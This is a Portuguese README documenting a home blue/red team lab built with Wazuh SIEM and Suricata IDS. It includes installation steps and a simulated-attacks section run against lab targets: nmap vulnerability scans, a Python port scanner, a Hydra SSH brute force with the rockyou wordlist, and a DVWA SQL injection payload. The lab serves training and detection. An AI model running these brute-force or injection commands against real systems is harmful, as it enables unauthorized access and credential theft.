# 🔵 SOC Lab — Blue Team & Red Team Home Lab

> Laboratório completo de Segurança Ofensiva e Defensiva com SIEM, IDS e simulação de ataques reais.

---

## 📋 Índice

- [Sobre o Projeto](#sobre-o-projeto)
- [Arquitetura do Lab](#arquitetura-do-lab)
- [Tecnologias Utilizadas](#tecnologias-utilizadas)
- [Configuração do Ambiente](#configuração-do-ambiente)
- [Instalação do Wazuh SIEM](#instalação-do-wazuh-siem)
- [Configuração dos Agentes](#configuração-dos-agentes)
- [Instalação do Suricata IDS](#instalação-do-suricata-ids)
- [Ataques Simulados](#ataques-simulados)
- [Monitoramento no Wazuh](#monitoramento-no-wazuh)
- [Aviso Legal](#aviso-legal)

---

## 📌 Sobre o Projeto

Este projeto documenta a criação de um laboratório de SOC (Security Operations Center) para estudo e prática de:

- **Blue Team**: Monitoramento, detecção e resposta a incidentes com Wazuh SIEM
- **Red Team**: Simulação de ataques com Kali Linux, Nmap, Hydra e DVWA
- **Network IDS**: Detecção de intrusões com Suricata integrado ao Wazuh

---

## 🏗️ Arquitetura do Lab

```
🖥️  PC Principal
├── Ubuntu Server  →  Wazuh SIEM + Suricata IDS  (192.168.0.4)
├── Metasploitable2 →  Alvo vulnerável             (192.168.0.5)
└── Ubuntu Desktop  →  Agente Wazuh monitorado     (192.168.0.10)

💻  Notebook
└── Kali Linux      →  Máquina atacante            (192.168.0.9)

🪟  Windows 10 físico → Agente Wazuh monitorado    (192.168.0.7)
```

### Configuração de Rede (VirtualBox)

| Adaptador | Tipo | Função |
|-----------|------|--------|
| Adaptador 1 | Bridge | Acesso à internet e rede local |
| Adaptador 2 | Rede Interna (SOC-LAB) | Comunicação isolada entre VMs |

---

## 🛠️ Tecnologias Utilizadas

| Ferramenta | Versão | Função |
|-----------|--------|--------|
| VirtualBox | 7.0.22 | Hypervisor |
| Wazuh | 4.7.5 | SIEM / XDR |
| Suricata | 7.0 | IDS/IPS de rede |
| Kali Linux | 2025.4 | Pentesting |
| Metasploitable | 2 | Alvo vulnerável |
| Ubuntu Server | 22.04 LTS | Host do SIEM |
| Ubuntu Desktop | 24.04 LTS | Alvo monitorado |

---

## ⚙️ Configuração do Ambiente

### VirtualBox — Configurar rede via CMD (se interface sumir)

```cmd
cd "C:\Program Files\Oracle\VirtualBox"
VBoxManage modifyvm "NomeDaVM" --nic2 intnet --intnet2 "SOC-LAB"
```

### Verificar configuração de rede das VMs

```cmd
VBoxManage showvminfo "NomeDaVM" | findstr "NIC"
```

---

## 🔵 Instalação do Wazuh SIEM

### No Ubuntu Server

```bash
# Baixar o script de instalação
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh

# Instalar (all-in-one)
sudo bash wazuh-install.sh -a
```

### Redefinir senha do admin

```bash
# Baixar ferramenta de senhas
wget https://packages.wazuh.com/4.7/wazuh-passwords-tool.sh

# Redefinir senha (deve ter maiúsculas, minúsculas, números e caractere especial)
chmod +x wazuh-passwords-tool.sh
sudo bash wazuh-passwords-tool.sh -u admin -p NovaSenha@2026*
```

### Acessar o Dashboard

```
URL: https://IP_DO_SERVIDOR
Usuário: admin
Senha: (definida acima)
```

### Iniciar serviços manualmente

```bash
sudo systemctl start wazuh-manager
sudo systemctl start wazuh-indexer
sudo systemctl start wazuh-dashboard
```

---

## 🤖 Configuração dos Agentes

### Agente Linux (Ubuntu Desktop)

```bash
# Instalar curl
sudo apt install curl -y

# Adicionar chave GPG
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg \
  --no-default-keyring \
  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg \
  --import && sudo chmod 644 /usr/share/keyrings/wazuh.gpg

# Adicionar repositório
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
  https://packages.wazuh.com/4.x/apt/ stable main" | \
  sudo tee /etc/apt/sources.list.d/wazuh.list

# Instalar agente versão compatível
sudo apt update && sudo WAZUH_MANAGER='192.168.0.4' \
  apt install wazuh-agent=4.7.5-1 -y

# Habilitar e iniciar
sudo systemctl enable wazuh-agent && sudo systemctl start wazuh-agent
```

### Corrigir IP do manager (se necessário)

```bash
sudo nano /var/ossec/etc/ossec.conf
# Alterar: <address>192.168.0.4</address>
sudo systemctl restart wazuh-agent
```

### Agente Windows (PowerShell como Admin)

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.5-1.msi `
  -OutFile ${env:tmp}\wazuh-agent
msiexec.exe /i ${env:tmp}\wazuh-agent /q `
  WAZUH_MANAGER='192.168.0.4' `
  WAZUH_AGENT_NAME='Windows' `
  WAZUH_REGISTRATION_SERVER='192.168.0.4'

# Iniciar serviço
NET START WazuhSvc
```

---

## 🛡️ Instalação do Suricata IDS

```bash
# Instalar
sudo apt install suricata -y

# Configurar interface de rede
sudo nano /etc/suricata/suricata.yaml
# Alterar: - interface: enp0s3

# Atualizar regras
sudo suricata-update

# Habilitar e iniciar
sudo systemctl enable suricata
sudo systemctl start suricata
```

### Integrar Suricata com Wazuh

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Adicionar antes de `</ossec_config>`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

```bash
sudo systemctl restart wazuh-manager
```

---

## 🔴 Ataques Simulados

### 1. Port Scan com Nmap

```bash
# Scan básico
nmap -sV -Pn 192.168.0.5

# Scan de vulnerabilidades
nmap -Pn --script vuln 192.168.0.5
```

**Resultado no Metasploitable (portas abertas):**

| Porta | Serviço | Versão |
|-------|---------|--------|
| 21 | FTP | vsftpd 2.3.4 ⚠️ Backdoor! |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 80 | HTTP | Apache 2.2.8 |
| 3306 | MySQL | 5.0.51a |
| 5432 | PostgreSQL | 8.3.0 |
| 5900 | VNC | Protocol 3.3 |

### 2. Port Scanner em Python

```python
import socket

ip = "192.168.0.5"  # IP do alvo

print(f"Escaneando {ip}...")
print("-" * 40)

for porta in range(1, 1025):
    conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conexao.settimeout(0.5)
    resultado = conexao.connect_ex((ip, porta))
    if resultado == 0:
        print(f"✅  Porta {porta} — ABERTA")
    conexao.close()

print("-" * 40)
print("Scan concluído!")
```

### 3. Brute Force SSH com Hydra

```bash
# Descompactar wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Ataque de força bruta
hydra -l usuario -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.0.10 -t 4 -V
```

**Alertas gerados no Wazuh:**
- `sshd: authentication failed` (Nível 5)
- Técnica MITRE: `T1110.001` (Brute Force)
- Tática: `Credential Access, Lateral Movement`

### 4. SQL Injection no DVWA

Acesse: `http://192.168.0.5/dvwa` (admin/password)

No campo **User ID**, insira:
```sql
1' OR 1=1#
```

**Resultado:** Retorna todos os usuários do banco de dados.

### 5. Vulnerability Scan

```bash
nmap -Pn --script vuln 192.168.0.5
```

**Vulnerabilidades encontradas:**
- `CVE-2011-2523` — vsftpd 2.3.4 backdoor (CRITICAL)
- `CVE-2014-3566` — SSL POODLE (HIGH)
- `CVE-2015-4000` — Logjam TLS (HIGH)
- `CVE-2007-6750` — Slowloris DoS (MEDIUM)
- SQL Injection em múltiplas rotas do Mutillidae

---

## 📊 Monitoramento no Wazuh

### Filtrar eventos por agente

1. Acesse `https://192.168.0.4`
2. Vá em **Security Events**
3. Clique em **+ Add filter**
4. Campo: `agent.name` | Operador: `is` | Valor: `Windows` ou `jonas-VirtualBox`

### Alertas mais importantes para monitorar

| Alerta | Descrição | Prioridade |
|--------|-----------|------------|
| Brute Force SSH/RDP | Múltiplas tentativas de login | 🔴 Alta |
| Privilege Escalation | Tentativa de elevação de privilégios | 🔴 Alta |
| Port Scan | Varredura de portas na rede | 🟡 Média |
| Authentication Failed | Falhas de autenticação repetidas | 🟡 Média |
| File Integrity | Modificação de arquivos críticos | 🟡 Média |
| New Process | Processo desconhecido iniciado | 🟢 Baixa |

### Técnicas MITRE ATT&CK detectadas

| ID | Técnica | Ataque |
|----|---------|--------|
| T1110.001 | Brute Force | Hydra SSH |
| T1021.004 | SSH Remote Services | Lateral Movement |
| T1078 | Valid Accounts | Login bem-sucedido |
| T1046 | Network Service Discovery | Nmap scan |

---

## ⚠️ Aviso Legal

> Este laboratório foi criado **exclusivamente para fins educacionais**.
> Todos os testes foram realizados em ambiente isolado e controlado.
> O uso de técnicas de ataque em sistemas sem autorização explícita é **crime** conforme a **Lei 12.737/2012 (Lei Carolina Dieckmann)**.
> 
> **Nunca utilize estas ferramentas em sistemas que não sejam seus ou sem autorização.**

---

## 👨‍💻 Autor

Desenvolvido como parte dos estudos em **Cybersecurity / Blue Team / SOC Analysis**.

---

---

## 🤖 Sobre a Documentação

Esta documentação foi elaborada com auxílio de **Inteligência Artificial (Claude - Anthropic)** durante a construção prática do laboratório.

O uso de IA faz parte da rotina moderna de trabalho em tecnologia, auxiliando na documentação, resolução de problemas e aprendizado contínuo.

> *"A IA não substitui o conhecimento — ela amplifica a capacidade de quem já está aprendendo."*

---

*Documentação gerada durante a construção do lab — Março/2026*
